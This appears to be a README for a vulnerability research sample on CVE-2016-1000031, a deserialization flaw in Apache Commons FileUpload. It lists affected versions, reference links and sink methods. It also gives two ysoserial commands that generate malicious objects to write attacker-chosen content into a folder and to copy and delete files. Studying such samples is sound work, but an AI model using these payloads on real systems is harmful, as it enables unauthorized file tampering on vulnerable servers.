# Sample Description

It is the CVE-2016-1000031 (Apache Commons FileUpload DiskFileItem File Manipulation Remote Code Execution)


## Exploit Example


- Vulnerable version: `commons-fileupload-1.3.2.jar`
- Fixed version: `commons-fileupload-1.3.3.jar`

## External Links


- Bug Track URL: https://issues.apache.org/jira/browse/FILEUPLOAD-279
- Commit URL (fixed in version 1.3.3): http://repo1.maven.org/maven2/commons-fileupload/commons-fileupload/1.3.3/
- URLs with explanation details:
    - https://www.tenable.com/security/research/tra-2016-12
    - https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
- Exploit Source: https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/FileUpload1.java
- DiskFileItem.java: https://github.com/apache/commons-fileupload/blob/c3161492712af0fab0ecde0fd294575acfb98d9d/src/main/java/org/apache/commons/fileupload/disk/DiskFileItem.java
- Apache Commons IO: https://github.com/apache/commons-io/tree/7c58d8a9919c5c9dbc1485a21d56bb3f37444060/src/main/java/org/apache/commons/io/output


## Exploit (Malicious Object)

### Exploit #1 (write.txt)
Generated with ysoserial using the command:

`java -jar ysoserial.jar FileUpload1 'write;hackedFolder/;new created with attacker-provided contents' > write.txt`

**Callstack:** `stack1.txt`


### Exploit #2 (copyAndDelete.txt)
Generated with ysoserial using the command:

`java -jar ysoserial.jar FileUpload1 'copyAndDelete;hackedFolder/file.txt;hackedFolder' > copyAndDelete.txt`

**Callstack:** `stack2.txt`

## Sinks

- `File.delete()`
- `new FileOutputStream()` (or `FileOutputStream.<init>`)
- `File.write()`
 